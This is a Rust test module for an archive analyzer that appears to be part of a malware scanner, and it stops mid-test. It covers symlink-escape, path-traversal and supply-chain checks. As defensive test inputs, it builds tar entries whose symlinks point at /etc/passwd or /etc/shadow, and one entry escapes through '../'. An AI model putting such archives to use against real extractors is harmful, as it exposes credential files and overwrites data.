use super::*;
use crate::capabilities::CapabilityMapper;
use guards::{ExtractionGuard, MAX_FILE_COUNT, sanitize_entry_path};
use std::fs::File;
use std::io::{Cursor, Write};

// Import external crate types (our modules shadow these names)
use ::tar;
use ::zip;

/// A symlink escape is excused by what the link is, or by the archive's
/// content-detected type, never by a name whoever built the archive chose:
/// a `testdata/` directory, a `.pkg.tar.zst` or a `docker.io_` file name.
#[test]
fn system_symlink_paths_normalize_dot_prefix() {
    for link in [
        "sbin/mount.ntfs-3g",
        "./sbin/mount.ntfs-3g",
        "././sbin/mount.ntfs-3g",
    ] {
        assert!(is_benign_archive_symlink_escape(&format!(
            "{link} -> /bin/ntfs-3g"
        )));
    }
    for link in [
        "../sbin/mount.ntfs-3g",
        "./../sbin/mount.ntfs-3g",
        "./data/evil",
    ] {
        assert!(!is_benign_archive_symlink_escape(&format!(
            "{link} -> /bin/ntfs-3g"
        )));
    }
    assert!(!is_benign_archive_symlink_escape(
        "./sbin/mount.ntfs-3g -> /etc/passwd"
    ));
    // `lib` names a directory, not a prefix: `library/` is user content.
    assert!(is_benign_archive_symlink_escape(
        "lib64/ld.so -> /usr/bin/ld.so"
    ));
    assert!(!is_benign_archive_symlink_escape(
        "library/x -> /usr/bin/curl"
    ));
    assert!(is_benign_archive_symlink_escape(
        "venv/bin/python3 -> /usr/bin/python3"
    ));
    assert!(!is_benign_archive_symlink_escape(
        "venv/bin/python3 -> /etc/shadow"
    ));
}

#[test]
fn rootfs_standard_symlinks_keep_both_operands_constrained() {
    for link in [
        "usr/lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
        "usr/lib/x86_64-linux-gnu/libdl.so -> /lib/x86_64-linux-gnu/libdl.so.2",
        "usr/bin/pidof -> /sbin/killall5",
        "bin/pidof -> /sbin/killall5",
        "dev/core -> /proc/kcore",
        "dev/fd -> /proc/self/fd",
        "lib/systemd/system/bootlogs.service -> /dev/null",
        "etc/sgml/catalog -> /var/lib/sgml-base/supercatalog",
        "usr/share/locale/locale.alias -> /etc/locale.alias",
    ] {
        assert!(is_benign_archive_symlink_escape(link), "{link}");
    }
    for link in [
        "data/libdl.so -> /lib/x86_64-linux-gnu/libdl.so.2",
        "usr/lib64/loader -> /etc/shadow",
        "usr/lib64/loader -> /lib/../../etc/shadow",
        "usr/lib/../../data/loader -> /lib/loader",
        "usr/bin/pidof -> /sbin/attacker",
        "dev/core -> /etc/passwd",
        "data/fd -> /proc/self/fd",
        "lib/systemd/system/../../data/x.service -> /dev/null",
        "etc/sgml/catalog -> /var/lib/other/secret",
        "usr/share/locale/locale.alias -> /etc/shadow",
    ] {
        assert!(!is_benign_archive_symlink_escape(link), "{link}");
    }
}

#[test]
fn symlink_escape_is_not_excused_by_names() {
    fn escape_findings(file_name: &str, link: &str, members: &[(&str, &[u8])]) -> usize {
        let mut archive = tar::Builder::new(Vec::new());
        for (name, body) in members {
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            archive.append_data(&mut header, name, *body).unwrap();
        }
        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Symlink);
        header.set_size(0);
        header.set_mode(0o777);
        archive
            .append_link(&mut header, link, "/etc/passwd")
            .unwrap();
        let tar_bytes = archive.into_inner().unwrap();
        let bytes = if file_name.ends_with(".zst") {
            zstd::encode_all(&tar_bytes[..], 0).unwrap()
        } else {
            tar_bytes
        };
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(file_name);
        std::fs::write(&path, bytes).unwrap();
        ArchiveAnalyzer::new()
            .with_capability_mapper(CapabilityMapper::empty())
            .analyze(&path)
            .unwrap()
            .findings
            .iter()
            .filter(|f| f.id.as_ref() == "anti-analysis/archive/symlink-escape")
            .count()
    }

    assert_eq!(
        escape_findings("update.tar", "data/evil", &[]),
        1,
        "control"
    );
    assert_eq!(
        escape_findings("update.tar", "testdata/evil", &[]),
        1,
        "a testdata/ directory in the archive"
    );
    assert_eq!(
        escape_findings("foo-1.0-1-x86_64.pkg.tar.zst", "data/evil", &[]),
        1,
        "an Arch package file name without an Arch package inside"
    );
    assert_eq!(
        escape_findings("docker.io_library_alpine.tar", "data/evil", &[]),
        1,
        "a container-registry file name without an image inside"
    );

    assert_eq!(
        escape_findings(
            "foo-1.0-1-x86_64.pkg.tar.zst",
            "usr/lib/libfoo.so",
            &[
                (".PKGINFO", b"pkgname = foo\npkgver = 1.0-1\n"),
                (".MTREE", b""),
            ]
        ),
        0,
        "a real Arch package may link out of the extraction root"
    );
    assert_eq!(
        escape_findings(
            "alpine.tar",
            "usr/lib/libfoo.so",
            &[
                (
                    "manifest.json",
                    br#"[{"Config":"c.json","RepoTags":["alpine:3"],"Layers":[]}]"#
                ),
                ("repositories", br#"{"alpine":{"3":"c"}}"#),
            ]
        ),
        0,
        "a `docker save` image may link out of the extraction root"
    );
}

/// Builds a tar the way `tar -cf x.tar .` does -- a leading `./` entry for
/// the directory itself -- and asserts it is not reported as zip-slip,
/// while a sibling tar carrying a real `../` escape still is.
#[test]
fn tar_dot_slash_root_entry_is_not_zip_slip() {
    fn traversal_findings(names: &[&str]) -> usize {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("sample.tar");
        let mut archive = tar::Builder::new(File::create(&path).unwrap());
        for name in names {
            let body = b"placeholder contents\n";
            let mut header = tar::Header::new_gnu();
            header.set_size(if name.ends_with('/') {
                0
            } else {
                body.len() as u64
            });
            header.set_mode(0o644);
            header.set_entry_type(if name.ends_with('/') {
                tar::EntryType::Directory
            } else {
                tar::EntryType::Regular
            });
            // Written straight into the header block: the `tar` crate's
            // `append_data` refuses a `..` path, which is exactly the entry
            // the escape half of this test needs.
            let raw = header.as_gnu_mut().unwrap();
            raw.name[..name.len()].copy_from_slice(name.as_bytes());
            header.set_cksum();
            let payload: &[u8] = if name.ends_with('/') { b"" } else { body };
            archive.append(&header, payload).unwrap();
        }
        archive.finish().unwrap();
        drop(archive);
        ArchiveAnalyzer::new()
            .with_capability_mapper(CapabilityMapper::empty())
            .analyze(&path)
            .unwrap()
            .findings
            .iter()
            .filter(|f| f.id.as_ref() == "anti-analysis/archive/path-traversal")
            .count()
    }

    assert_eq!(
        traversal_findings(&["./", "./library.c", "./library.h"]),
        0,
        "`./` names the extraction root, not an escape from it"
    );
    assert_eq!(
        traversal_findings(&["./", "./library.c", "../escape.sh"]),
        1,
        "a genuine `../` entry must still be reported"
    );
}

#[test]
fn archive_go_workspace_metadata_reaches_dependency_context() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("workspace.tar");
    let mut archive = tar::Builder::new(File::create(&path).unwrap());
    for (name, source) in [
        (
            "go.work",
            "use ./app\nreplace example.test/lib => example.test/reviewed v2.0.0\n",
        ),
        (
            "app/go.mod",
            "module app\nrequire example.test/lib v1.0.0\nrequire example.test/local v1.0.0\nreplace example.test/local => ../local\n",
        ),
        (
            "app/go.sum",
            "example.test/reviewed v2.0.0/go.mod h1:METADATA\nexample.test/lib v9.0.0 h1:HISTORY\n",
        ),
        ("go.work.sum", "example.test/reviewed v2.0.0 h1:TREE\n"),
        ("local/go.mod", "module example.test/local\n"),
        (
            "vendored/go.mod",
            "module vendorapp\nrequire example.test/bundled v1.0.0\n",
        ),
        (
            "vendored/vendor/modules.txt",
            "# example.test/bundled v1.0.0\n## explicit\nexample.test/bundled\n",
        ),
        (
            "vendored/vendor/example.test/bundled/library.go",
            "package bundled\nfunc Version() string { return \"test\" }\n",
        ),
    ] {
        let mut header = tar::Header::new_gnu();
        header.set_size(source.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        archive
            .append_data(&mut header, name, source.as_bytes())
            .unwrap();
    }
    archive.finish().unwrap();
    drop(archive);
    let report = ArchiveAnalyzer::new()
        .with_capability_mapper(CapabilityMapper::empty())
        .analyze(&path)
        .unwrap();
    let members: Vec<_> = report
        .files
        .iter()
        .map(|f| filefacts::package_context::ReferenceMember {
            path: &f.path,
            references: f
                .filefacts
                .as_ref()
                .map_or(&[][..], |v| v.references.as_slice()),
        })
        .collect();
    let context = filefacts::package_context::go_dependency_context(
        &members,
        &filefacts::package_context::ContextLimits::default(),
    );
    let dependencies: Vec<_> = context
        .values()
        .flatten()
        .filter(|r| r.kind == filefacts::RefKind::Dependency)
        .collect();
    assert_eq!(dependencies.len(), 1);
    assert_eq!(
        dependencies[0].locator,
        filefacts::RefLocator::Purl("pkg:golang/example.test/reviewed@v2.0.0".into())
    );
    assert_eq!(dependencies[0].pinned_hash.as_ref().unwrap().value, "TREE");
    assert_eq!(
        context
            .values()
            .flatten()
            .filter(|r| r.kind == filefacts::RefKind::Local)
            .count(),
        2
    );
}

#[test]
fn archive_manifest_retains_filefacts_identity_claims() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("bundle.zip");
    let manifest = br#"{"name":"example-package","version":"1.2.3","author":"Example Publisher"}"#;
    let mut zip = zip::ZipWriter::new(File::create(&path).unwrap());
    zip.start_file(
        "package/package.json",
        zip::write::SimpleFileOptions::default(),
    )
    .unwrap();
    zip.write_all(manifest).unwrap();
    zip.finish().unwrap();
    let report = ArchiveAnalyzer::new()
        .with_capability_mapper(CapabilityMapper::empty())
        .analyze(&path)
        .unwrap();
    let member = report
        .files
        .iter()
        .find(|file| file.path.ends_with("package/package.json"))
        .expect("manifest member");
    let expected =
        crate::analysis_context::AnalysisContext::open(Path::new("package.json"), manifest)
            .identity()
            .expect("standalone manifest identity");
    assert_eq!(expected.name.as_ref().unwrap().value, "example-package");
    assert_eq!(expected.name.as_ref().unwrap().source, "npm.name");
    assert_eq!(
        serde_json::to_value(&member.identity).unwrap(),
        serde_json::to_value(Some(expected)).unwrap(),
        "archive member must preserve the same manifest claims as standalone extraction",
    );
}

fn pack_manifest(publisher: &str, entries: &[&str]) -> AnalysisReport {
    let mut f = FileAnalysis::new(
        0,
        "extension/package.json".into(),
        "package.json".into(),
        String::new(),
        0,
    );
    f.kv.insert("publisher".into(), serde_json::json!(publisher));
    for (i, e) in entries.iter().enumerate() {
        f.kv.insert(format!("extensionPack[{i}]"), serde_json::json!(e));
    }
    report_with(vec![f])
}

#[test]
fn extension_pack_counts_separates_borrowed_from_own() {
    // The laundering shape: one of the publisher's own extensions carried
    // in by three well-known third-party ones.
    assert_eq!(
        extension_pack_counts(&pack_manifest(
            "krabt",
            &[
                "krabt.krabt-proto",
                "eamodio.gitlens",
                "golang.go",
                "ms-python.python",
            ],
        )),
        Some((4, 1)),
    );
    // A vendor pack of its own extensions.
    assert_eq!(
        extension_pack_counts(&pack_manifest(
            "ms-python",
            &["ms-python.python", "ms-python.debugpy"],
        )),
        Some((2, 2)),
    );
}

#[test]
fn extension_pack_counts_abstains_without_a_pack_or_publisher() {
    assert_eq!(extension_pack_counts(&pack_manifest("krabt", &[])), None);
    // Entries but no publisher: nothing to compare ownership against.
    assert_eq!(
        extension_pack_counts(&pack_manifest("", &["eamodio.gitlens"])),
        None,
    );
}

fn pkg_json_member(deps: &[&str]) -> FileAnalysis {
    let mut f = FileAnalysis::new(
        0,
        "package/package.json".into(),
        "package.json".into(),
        String::new(),
        0,
    );
    for d in deps {
        f.kv.insert(
            format!("dependencies.{d}"),
            serde_json::Value::String("^1.0.0".into()),
        );
    }
    f
}

fn code_member(specifiers: &[&str]) -> FileAnalysis {
    let mut f = FileAnalysis::new(
        1,
        "package/dist/index.js".into(),
        "javascript".into(),
        String::new(),
        0,
    );
    f.imports = specifiers
        .iter()
        .map(|s| crate::types::Import::new(*s, None))
        .collect();
    f
}

fn report_with(files: Vec<FileAnalysis>) -> AnalysisReport {
    let mut r = AnalysisReport::new(TargetInfo::default());
    r.files = files;
    r
}

#[test]
fn phantom_dep_counts_unimported_runtime_dep() {
    // @turbopuffer is imported (incl. a subpath); easy-day-js is declared
    // but never imported → exactly one phantom.
    let report = report_with(vec![
        pkg_json_member(&["@turbopuffer/turbopuffer", "easy-day-js"]),
        code_member(&["@turbopuffer/turbopuffer/resources/custom", "node:crypto"]),
    ]);
    assert_eq!(compute_unused_runtime_deps(&report), Some(1));
}

/// The compact-retention path clears `FileAnalysis::imports` on every
/// member and keeps only the precompacted names, so a member reaching this
/// function that way carries no live imports at all. That is what every
/// scan-worker caller does, and it silently zeroed this metric: with no
/// imports observed the "cannot distinguish unused from unparsed" guard
/// returned `None`, and the phantom-dependency trait — and the hostile
/// composite built on it — could never fire outside plain `cleave`.
#[test]
fn phantom_dep_reads_precompacted_imports() {
    let mut code = code_member(&["dayjs/plugin/utc"]);
    // Mirror `precompact_member_facts`: names survive, the vector does not.
    code.precompact_facts = Some(crate::types::compact::compact_facts_from_parts(
        &code, false,
    ));
    code.imports = Vec::new();

    let report = report_with(vec![pkg_json_member(&["dayjs", "easy-day-js"]), code]);
    // `dayjs` is imported via a subpath, `easy-day-js` never → one phantom.
    assert_eq!(compute_unused_runtime_deps(&report), Some(1));
}

#[test]
fn phantom_dep_zero_when_all_imported() {
    let report = report_with(vec![
        pkg_json_member(&["dayjs"]),
        code_member(&["dayjs/plugin/utc"]),
    ]);
    assert_eq!(compute_unused_runtime_deps(&report), Some(0));
}

#[test]
fn phantom_dep_ignores_manifest_self_reported_imports() {
    // The manifest member also carries its declared deps as `imports`
    // (engine surfaces them for `type: import`); those must not count as
    // real usage, or every dep would look used.
    let mut manifest = pkg_json_member(&["easy-day-js"]);
    manifest.imports = vec![crate::types::Import::new("easy-day-js", None)];
    let report = report_with(vec![manifest, code_member(&["@turbopuffer/turbopuffer"])]);
    assert_eq!(compute_unused_runtime_deps(&report), Some(1));
}

#[test]
fn phantom_dep_none_without_imports() {
    // No code imports observed → cannot conclude; emit nothing.
    let report = report_with(vec![pkg_json_member(&["easy-day-js"])]);
    assert_eq!(compute_unused_runtime_deps(&report), None);
}

#[test]
fn phantom_dep_none_without_manifest() {
    let report = report_with(vec![code_member(&["dayjs"])]);
    assert_eq!(compute_unused_runtime_deps(&report), None);
}

fn write_test_traits(yaml: &str) -> tempfile::NamedTempFile {
    let mut file = tempfile::NamedTempFile::new().expect("create temp yaml");
    file.write_all(yaml.as_bytes()).expect("write temp yaml");
    file
}

fn archive_scope_test_finding(id: &str, location: Option<&str>) -> Finding {
    Finding {
        id: id.into(),
        evidence: vec![Evidence {
            location: location.map(str::to_string),
            ..Evidence::default()
        }],
        ..Finding::default()
    }
}

#[test]
fn archive_member_locations_preserve_offsets_and_locate_unpositioned_evidence() {
    let mut offset_finding = archive_scope_test_finding("offset", Some("0x10"));
    locate_archive_member_finding(&mut offset_finding, "a.js");
    assert_eq!(
        offset_finding.evidence[0].location.as_deref(),
        Some("archive:a.js:0x10")
    );

    let mut unlocated_finding = archive_scope_test_finding("unlocated", None);
    locate_archive_member_finding(&mut unlocated_finding, "b.js");
    assert_eq!(
        unlocated_finding.evidence[0].location.as_deref(),
        Some("archive:b.js")
    );

    let mut root_finding = archive_scope_test_finding("root", None);
    locate_archive_root_findings(std::slice::from_mut(&mut root_finding));
    assert_eq!(
        root_finding.evidence[0].location.as_deref(),
        Some("archive:")
    );
}

#[test]
fn archive_member_downgrade_refreshes_aggregate_without_hiding_runtime_code() {
    let yaml = r#"
defaults:
  for: [zip, python]
  platforms: [unix, windows]
traits:
  - id: "test/member::encoded"
    desc: "encoded execution"
    crit: suspicious
    if: {type: raw, substr: "PAYLOAD"}
    downgrade:
      scope: archive
      all:
        - id: "test/gate::static-reader"
        - type: path
          regex: '(^|/)tests/fixtures/'
  - id: "test/gate::static-reader"
    desc: "static reader"
    crit: notable
    if: {type: text, substr: "READER"}
"#;
    for (runtime, own_payload, expected) in [
        (false, false, Criticality::Notable),
        (true, false, Criticality::Suspicious),
        (false, true, Criticality::Suspicious),
    ] {
        let traits_file = write_test_traits(yaml);
        let mapper = CapabilityMapper::from_yaml(traits_file.path()).expect("load mapper");
        let mut report = AnalysisReport::new(TargetInfo {
            path: if own_payload {
                "/ordinary/outer.zip"
            } else {
                "/tests/fixtures/outer.zip"
            }
            .to_string(),
            file_type: "zip".to_string(),
            size_bytes: if own_payload { 7 } else { 4 },
            ..TargetInfo::default()
        });
        let mut finding = archive_scope_test_finding("test/member::encoded", None);
        finding.crit = Criticality::Suspicious;
        report.findings.push(finding.clone());
        let mut gate = archive_scope_test_finding("test/gate::static-reader", None);
        gate.crit = Criticality::Notable;
        report.findings.push(gate);
        for path in ["pkg/tests/fixtures/payload.py", "pkg/src/runtime.py"] {
            if path.contains("runtime") && !runtime {
                continue;
            }
            let mut member =
                FileAnalysis::new(0, path.to_string(), "python".to_string(), String::new(), 0);
            member.findings.push(finding.clone());
            report.files.push(member);
        }
        let bytes = if own_payload {
            b"PAYLOAD".as_slice()
        } else {
            b"ROOT".as_slice()
        };
        if own_payload {
            assert!(
                mapper
                    .evaluate_traits_with_ast(&report, bytes, None, None)
                    .iter()
                    .any(|f| f.id.as_ref() == "test/member::encoded"),
                "container-owned raw detection must match the supplied bytes"
            );
        }
        ArchiveAnalyzer::new()
            .with_capability_mapper(mapper)
            .evaluate_container_findings(&mut report, bytes, FileType::Zip);
        let aggregate = report
            .findings
            .iter()
            .find(|f| f.id.as_ref() == "test/member::encoded")
            .expect("aggregate retained");
        assert_eq!(
            aggregate.crit, expected,
            "runtime={runtime}, own_payload={own_payload}"
        );
        let fixture = report
            .files
            .iter()
            .find(|f| f.path.contains("tests/fixtures"))
            .expect("fixture retained");
        assert_eq!(fixture.findings[0].crit, Criticality::Notable);
    }
}

#[test]
fn container_composites_attribute_member_evidence_to_archive_paths() {
    let yaml = r#"
defaults:
  for: [zip, javascript]
  platforms: [unix, windows, macos]
traits:
  - id: "test/archive::member-a"
    desc: "member A marker"
    crit: baseline
    if:
      type: string_literal
      exact: "a"
  - id: "test/archive::member-b"
    desc: "member B marker"
    crit: baseline
    if:
      type: string_literal
      exact: "b"
  - id: "test/archive::nested-c"
    desc: "nested C marker"
    crit: baseline
    if:
      type: string_literal
      exact: "c"
composite_rules:
  - id: "test/archive::same-archive-members"
    desc: "two direct members of one archive"
    crit: suspicious
    scope: archive
    all:
      - id: "test/archive::member-a"
      - id: "test/archive::member-b"
  - id: "test/archive::no-cross-nested-archive"
    desc: "direct and nested archive members"
    crit: suspicious
    scope: archive
    all:
      - id: "test/archive::member-a"
      - id: "test/archive::nested-c"
"#;
    let traits_file = write_test_traits(yaml);
    let mapper = CapabilityMapper::from_yaml(traits_file.path()).expect("load test mapper");
    let archive = tempfile::NamedTempFile::new().expect("create archive path");
    let archive_path = archive.path().to_string_lossy().into_owned();
    let mut report = AnalysisReport::new(TargetInfo {
        path: archive_path.clone(),
        file_type: "zip".to_string(),
        size_bytes: 4,
        ..TargetInfo::default()
    });

    for (id, path, location) in [
        ("test/archive::member-a", "a.js", Some("0x10")),
        ("test/archive::member-b", "b.js", None),
        ("test/archive::nested-c", "inner.zip!!c.js", Some("0x20")),
    ] {
        let mut member = FileAnalysis::new(
            0,
            format!("{archive_path}!!{path}"),
            "javascript".to_string(),
            String::new(),
            0,
        );
        member
            .findings
            .push(archive_scope_test_finding(id, location));
        report.files.push(member);
    }

    ArchiveAnalyzer::new()
        .with_capability_mapper(mapper)
        .evaluate_container_findings(&mut report, b"ROOT", FileType::Zip);

    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.id.as_ref() == "test/archive::same-archive-members"),
        "separate direct members should join at their containing archive scope"
    );
    let same_archive = report
        .findings
        .iter()
        .find(|finding| finding.id.as_ref() == "test/archive::same-archive-members")
        .expect("same archive composite");
    let locations: Vec<_> = same_archive
        .evidence
        .iter()
        .filter_map(|evidence| evidence.location.as_deref())
        .collect();
    assert!(locations.contains(&"archive:a.js:0x10"));
    assert!(
        !report
            .findings
            .iter()
            .any(|finding| finding.id.as_ref() == "test/archive::no-cross-nested-archive"),
        "direct and nested members must not join across the nested archive boundary"
    );
}

fn make_archive_test_mapper() -> crate::capabilities::CapabilityMapper {
    let yaml = r#"
defaults:
  for: [binaries, scripts, source, manifests, documents, media, data, tar, zip, npm, whl]
  platforms: [unix, windows, macos]

traits:
  - id: "test/archive::package-json-basename"
    desc: "package.json basename"
    crit: baseline
    if:
      type: basename
      exact: "package.json"

  - id: "test/archive::setup-py-basename"
    desc: "setup.py basename"
    crit: baseline
    if:
      type: basename
      exact: "setup.py"

  - id: "test/archive::exe-extension-basename"
    desc: "exe basename"
    crit: notable
    if:
      type: basename
      regex: "\\.exe$"

  - id: "test/archive::dll-extension-basename"
    desc: "dll basename"
    crit: notable
    if:
      type: basename
      regex: "\\.dll$"

  - id: "test/archive::png-extension-basename"
    desc: "png basename"
    crit: notable
    if:
      type: basename
      regex: "\\.png$"

composite_rules:
  - id: "test/supply-chain::npm-package-with-exe"
    desc: "NPM package with embedded exe"
    crit: suspicious
    # Cross-file by design: the manifest and the binary are
    # different archive members, so this must opt in to pooling.
    scope: archive
    all:
      - id: "test/archive::package-json-basename"
      - id: "test/archive::exe-extension-basename"

  - id: "test/supply-chain::python-package-with-dll"
    desc: "Python package with embedded dll"
    crit: suspicious
    # Cross-file by design: the manifest and the binary are
    # different archive members, so this must opt in to pooling.
    scope: archive
    all:
      - id: "test/archive::setup-py-basename"
      - id: "test/archive::dll-extension-basename"

  - id: "test/supply-chain::npm-package-with-image"
    desc: "NPM package with embedded image"
    crit: notable
    # Cross-file by design: the manifest and the binary are
    # different archive members, so this must opt in to pooling.
    scope: archive
    all:
      - id: "test/archive::package-json-basename"
      - id: "test/archive::png-extension-basename"
"#;
    let file = write_test_traits(yaml);
    crate::capabilities::CapabilityMapper::from_yaml(file.path()).expect("load archive mapper")
}

#[test]
fn test_new() {
    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    assert_eq!(analyzer.max_depth, 3);
    assert_eq!(analyzer.current_depth, 0);
}

#[test]
fn test_default() {
    let analyzer = ArchiveAnalyzer::default();
    assert_eq!(analyzer.max_depth, 3);
    assert_eq!(analyzer.current_depth, 0);
}

#[test]
fn test_with_depth() {
    let analyzer = ArchiveAnalyzer::new().with_depth(5);
    assert_eq!(analyzer.current_depth, 5);
}

#[test]
fn archive_analyzer_config_applies_analysis_options() {
    let options = crate::AnalysisOptions {
        all_files: true,
        max_memory_file_size: 42,
        ..crate::AnalysisOptions::default()
    };

    let analyzer =
        ArchiveAnalyzerConfig::from_analysis_options(&options).apply(ArchiveAnalyzer::new());

    assert_eq!(analyzer.max_memory_file_size, 42);
    assert!(
        analyzer
            .analysis_options
            .as_ref()
            .is_some_and(|opts| opts.all_files)
    );
}

#[test]
fn test_can_analyze() {
    let analyzer = ArchiveAnalyzer::new();
    let fixtures = Path::new("tests/fixtures/archives");
    assert!(analyzer.can_analyze(&fixtures.join("test.zip")));
    assert!(analyzer.can_analyze(&fixtures.join("test.tar.gz")));
    assert!(!analyzer.can_analyze(&fixtures.join("testfile.txt")));
    // Non-existent paths always return false (no magic to read)
    assert!(!analyzer.can_analyze(Path::new("/tmp/nonexistent.zip")));
}

#[test]
fn test_calculate_sha256() {
    let _analyzer = ArchiveAnalyzer::new();
    let data = b"test data";
    let hash = calculate_sha256(data);
    assert_eq!(hash.len(), 64); // SHA256 is 64 hex characters
    assert_eq!(
        hash,
        "916f0027a575074ce72a331777c3478d6513f786a591bd892da1a577bf2335f9"
    );
}

#[test]
fn go_module_download_retains_package_type_and_analyzes_members() {
    let dir = tempfile::tempdir().unwrap();
    // A proxy response can be stored under its digest with no extension.
    let path = dir.path().join("download");
    let mut zip = zip::ZipWriter::new(File::create(&path).unwrap());
    let options = zip::write::SimpleFileOptions::default();
    for (name, bytes) in [
        ("go.mod", "module example.com/hello\n\ngo 1.23\n"),
        (
            "hello.go",
            "package hello\nfunc Hello() string { return \"hello\" }\n",
        ),
    ] {
        zip.start_file(format!("example.com/hello@v1.2.3/{name}"), options)
            .unwrap();
        zip.write_all(bytes.as_bytes()).unwrap();
    }
    zip.finish().unwrap();
    let report = ArchiveAnalyzer::new()
        .with_capability_mapper(CapabilityMapper::empty())
        .analyze(&path)
        .unwrap();
    assert_eq!(report.target.file_type, "go_module");
    for (suffix, kind) in [("go.mod", "go.mod"), ("hello.go", "go")] {
        let member = report
            .files
            .iter()
            .find(|f| f.path.ends_with(suffix))
            .expect("Go module member must be analyzed");
        assert_eq!(member.file_type, kind);
    }
    let kind = crate::composite_rules::FileType::from_str(&report.target.file_type);
    assert!(kind.is_package());
    assert!(kind.is_archive());
}

#[test]
fn test_analyze_zip_with_shell_script() {
    // Create a test ZIP with a shell script inside
    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("test.zip");

    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);

    let options =
        zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);
    zip.start_file("test.sh", options).unwrap();
    zip.write_all(b"#!/bin/sh\necho 'hello'").unwrap();
    zip.finish().unwrap();

    let analyzer = ArchiveAnalyzer::new();
    let result = analyzer.analyze(&zip_path);

    assert!(result.is_ok());
    let report = result.unwrap();
    assert_eq!(report.target.file_type, "zip");
    assert!(
        report
            .structure
            .iter()
            .any(|s| s.id.starts_with("archive/"))
    );
}

/// A zip with no bytecode must not be treated as a Java archive.
///
/// `analyze_jar_archive` samples "non-class files" as if they were a JAR's
/// incidental resources. For a package with no bytecode that set is the
/// whole payload, and the sample used to truncate it in walkdir order --
/// so a members list longer than the cap silently lost whatever sorted
/// last. Here that is `zz-late/package.json`, the file a package verdict
/// leans on hardest.
#[test]
fn non_java_zip_keeps_late_sorting_manifest() {
    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("pkg.zip");

    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options =
        zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);

    // Comfortably more members than the old cap, none of them Java.
    for i in 0..150 {
        zip.start_file(format!("aa-bulk/mod{i}.js"), options)
            .unwrap();
        zip.write_all(b"export const x = 1;\n").unwrap();
    }
    // Sorts after every bulk member under any ordering the walk produces.
    zip.start_file("zz-late/package.json", options).unwrap();
    zip.write_all(br#"{"name":"late","version":"1.0.0"}"#)
        .unwrap();
    zip.finish().unwrap();

    let analyzer = ArchiveAnalyzer::new();
    let report = analyzer.analyze(&zip_path).expect("analysis succeeds");

    assert!(
        report
            .files
            .iter()
            .any(|f| f.path.ends_with("zz-late/package.json")),
        "manifest was dropped from a {}-member non-Java zip; files: {}",
        151,
        report.files.len()
    );
}

/// The routing predicate keys on bytecode, not on the archive extension.
#[test]
fn java_members_detected_by_content() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("index.js"), b"1").unwrap();
    assert!(!contains_java_members(dir.path()));

    std::fs::write(dir.path().join("Main.class"), b"\xca\xfe\xba\xbe").unwrap();
    assert!(contains_java_members(dir.path()));

    let manifest_dir = tempfile::tempdir().unwrap();
    let meta = manifest_dir.path().join("META-INF");
    std::fs::create_dir_all(&meta).unwrap();
    std::fs::write(meta.join("MANIFEST.MF"), b"Manifest-Version: 1.0\n").unwrap();
    assert!(contains_java_members(manifest_dir.path()));
}

#[test]
fn test_max_depth_exceeded() {
    let analyzer = ArchiveAnalyzer::new().with_depth(3);

    // Create a temporary ZIP file
    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("test.zip");

    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options =
        zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);
    zip.start_file("dummy.txt", options).unwrap();
    zip.write_all(b"test").unwrap();
    zip.finish().unwrap();

    let result = analyzer.analyze(&zip_path);
    assert!(result.is_err());
    assert!(
        result
            .unwrap_err()
            .to_string()
            .contains("Maximum archive depth")
    );
}

#[test]
fn test_with_zip_passwords() {
    let passwords = vec!["pass1".to_string(), "pass2".to_string()];
    let analyzer = ArchiveAnalyzer::new().with_zip_passwords(passwords.clone());
    assert_eq!(&*analyzer.zip_passwords, passwords.as_slice());
}

#[test]
fn test_with_zip_passwords_empty_by_default() {
    let analyzer = ArchiveAnalyzer::new();
    assert!(analyzer.zip_passwords.is_empty());
}

#[test]
fn test_encrypted_zip_with_correct_password() {
    use zip::unstable::write::FileOptionsExt;
    use zip::write::SimpleFileOptions;

    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("encrypted.zip");

    // Create encrypted zip with password "secret"
    let file = File::create(&zip_path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let options = SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .with_deprecated_encryption(b"secret")
        .unwrap();
    zip.start_file("test.txt", options).unwrap();
    zip.write_all(b"hello world").unwrap();
    zip.finish().unwrap();

    // Analyze with correct password
    let analyzer = ArchiveAnalyzer::new().with_zip_passwords(vec!["secret".to_string()]);
    let result = analyzer.analyze(&zip_path);
    assert!(result.is_ok(), "Should decrypt with correct password");
}

#[test]
fn test_encrypted_zip_with_wrong_password() {
    use zip::write::SimpleFileOptions;

    let temp_dir = tempfile::tempdir().unwrap();
    let zip_path = temp_dir.path().join("encrypted.zip");

    // Create an AES-encrypted zip with password "secret". Unlike the
    // legacy ZipCrypto scheme (`with_deprecated_encryption`), whose
    // wrong-password rejection is only a probabilistic 1-byte check —
    // see the `zip` crate's own doc comment on `by_index_decrypt`, "This
    // function sometimes accepts wrong password... 1/256 chance" — AES
    // decryption is verified against an HMAC-SHA1 authentication code
    // covering the whole ciphertext, so a wrong password deterministically
    // fails instead of flaking.
    let file = File::create(&zip_path).unwrap();
